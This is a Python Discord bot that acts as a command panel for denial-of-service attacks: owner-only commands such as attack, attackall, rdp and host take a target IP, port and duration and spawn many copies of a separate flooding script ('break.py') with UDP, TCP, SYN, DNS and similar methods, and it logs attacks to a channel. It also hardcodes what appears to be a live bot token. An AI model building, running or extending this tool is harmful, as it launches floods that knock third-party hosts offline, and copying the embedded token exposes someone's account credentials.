import discord
import os
import time
import sys
from discord.ext import commands
intents = discord.Intents.all()

owners  = [863221451528208416, 1027116700652548146, 939792093973475379, 902873125589516289]

mt = ["UDP", "UDPV2", "UDPV3", "TCP", "TCPV2", "TCPV3", "OVH", "OVHV2", "OVHV3", "OVH4", "DNS", "DNSV2", "DNSV3", "SYN", "SYNV2", "SYNV3", "SYNV4", "FLOOD", "FLOODV2", "FLOODV3"]

pref = '*'
client = commands.Bot(command_prefix=pref, intents=intents, help_command=None)

@client.event
async def on_ready():
    print(f"{client.user.name}>> Online!")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{pref}help"))


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("Command Not Found")
    
@client.command()
async def ping(ctx):
    embed=discord.Embed(
        title=f":hourglass: Bot Ping is {round(client.latency * 1000)}ms",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

@client.command()
async def attack(ctx, method, ip, port, times):
    if ctx.author.id not in owners:
        await ctx.send("**Error:** You dont have permission!")
    else:
      if method not in mt:
        await ctx.send("**Error:** Method Not Found!")
      else:
        embed2=discord.Embed(
        title="ATTACK SEND",
        description="Host   : {}:{}\nTimes  : {}s\nMethod : {}".format(ip, port, times, method),
        color=discord.Colour.red()
               )
        await ctx.reply(embed=embed2)
        os.system(f"start python break.py {method} {ip} {port} {times}")
        os.system(f"start python break.py {method} {ip} {port} {times}")
        os.system(f"start python break.py {method} {ip} {port} {times}")
        os.system(f"start python break.py {method} {ip} {port} {times}")
        os.system(f"start python break.py {method} {ip} {port} {times}")

@client.command()
async def attackall(ctx, ip, port, times):
    if ctx.author.id not in owners:
        await ctx.send("**Error:** You dont have permission!")
    else:
        embed2=discord.Embed(
        title="ATTACK SEND",
        description="Host   : {}:{}\nTimes  : {}s\nMethod : ALL".format(ip, port, times),
        color=discord.Colour.red()
               )
        msg = await ctx.reply(embed=embed2)
        os.system(f"start python break.py UDP {ip} {port} {times}")
        os.system(f"start python break.py UDPV2 {ip} {port} {times}")
        os.system(f"start python break.py UDPV3 {ip} {port} {times}")
        os.system(f"start python break.py TCP {ip} {port} {times}")
        os.system(f"start python break.py TCPV2 {ip} {port} {times}")
        os.system(f"start python break.py TCPV3 {ip} {port} {times}")
        os.system(f"start python break.py OVH {ip} {port} {times}")
        os.system(f"start python break.py OVHV2 {ip} {port} {times}")
        os.system(f"start python break.py OVHV3 {ip} {port} {times}")
        os.system(f"start python break.py OVHV4 {ip} {port} {times}")
        os.system(f"start python break.py DNS {ip} {port} {times}")
        os.system(f"start python break.py DNSV2 {ip} {port} {times}")
        os.system(f"start python break.py DNSV3 {ip} {port} {times}")
        os.system(f"start python break.py SYN {ip} {port} {times}")
        os.system(f"start python break.py SYNV2 {ip} {port} {times}")
        os.system(f"start python break.py SYNV3 {ip} {port} {times}")
        os.system(f"start python break.py SYNV4 {ip} {port} {times}")
        os.system(f"start python break.py FLOOD {ip} {port} {times}")
        os.system(f"start python break.py FLOODV2 {ip} {port} {times}")
        os.system(f"start python break.py FLOODV3 {ip} {port} {times}")

@client.command()
async def rdp(ctx, ip, port, times):
  if ctx.author.id not in owners:
      await ctx.send("**Error:** You dont have permission!")
  else:
      embed2=discord.Embed(
      title="ATTACK SEND",
      description="Host   : {}:{}\nTimes  : {}s\nMethod : RDP".format(ip, port, times),
      color=discord.Colour.red()
             )
      msg = await ctx.reply(embed=embed2)
      os.system(f"start python break.py UDP {ip} {port} {times}")
      os.system(f"start python break.py UDPV2 {ip} {port} {times}")
      os.system(f"start python break.py TCP {ip} {port} {times}")
      channel = client.get_channel(1025353930886103090)
      embed3 = discord.Embed(title='LOGS ATTACK', description=f'Host      : {ip}\nTimes     : {times}s\nMethod    : HOST')
      await channel.send(embed=embed3)
        
@client.command()
async def host(ctx, ip, port, times):
    if ctx.author.id not in owners:
        await ctx.send("**Error:** You dont have permission!")
    else:
        embed2=discord.Embed(
        title="ATTACK SEND",
        description="Host   : {}:{}\nTimes  : {}s\nMethod : HOST".format(ip, port, times),
        color=discord.Colour.red()
               )
        msg = await ctx.reply(embed=embed2)
        os.system(f"start python break.py UDPV3 {ip} {port} {times}")
        os.system(f"start python break.py TCPV2 {ip} {port} {times}")
        os.system(f"start python break.py TCPV3 {ip} {port} {times}")
        os.system(f"start python break.py OVH {ip} {port} {times}")
        os.system(f"start python break.py OVHV2 {ip} {port} {times}")
        os.system(f"start python break.py OVHV3 {ip} {port} {times}")
        os.system(f"start python break.py OVHV4 {ip} {port} {times}")
        os.system(f"start python break.py DNS {ip} {port} {times}")
        os.system(f"start python break.py DNSV2 {ip} {port} {times}")
        os.system(f"start python break.py DNSV3 {ip} {port} {times}")
        os.system(f"start python break.py SYN {ip} {port} {times}")
        os.system(f"start python break.py SYNV2 {ip} {port} {times}")
        os.system(f"start python break.py SYNV3 {ip} {port} {times}")
        os.system(f"start python break.py SYNV4 {ip} {port} {times}")
        os.system(f"start python break.py FLOOD {ip} {port} {times}")
        os.system(f"start python break.py FLOODV2 {ip} {port} {times}")
        os.system(f"start python break.py FLOODV3 {ip} {port} {times}")

@client.command()
async def help(ctx):
    await ctx.send(f"```\n{pref}ping\n{pref}rdp\n{pref}host\n{pref}attack\n{pref}attackall\n{pref}usage\n{pref}methods```")

@client.command()
async def usage(ctx):
    await ctx.send(f"```\n- {pref}attack METHOD IP PORT TIMES\n\n-{pref}attackall IP PORT TIMES\n\n- {pref}rdp IP PORT TIMES\n\n- {pref}host IP PORT TIMES```")
    
@client.command()
async def methods(ctx):
    embed=discord.Embed(
        title="- TCP\n- UDP",
        color=discord.Colour.red()
    )
    await ctx.send(embed=embed)



client.run("MTAyNzI1NTE4Mjc4ODEzNzAzMw.G8vBcl.dcAIMiQweSzjgodyyVtDy2lrjbYRX3SOUlD0n0")
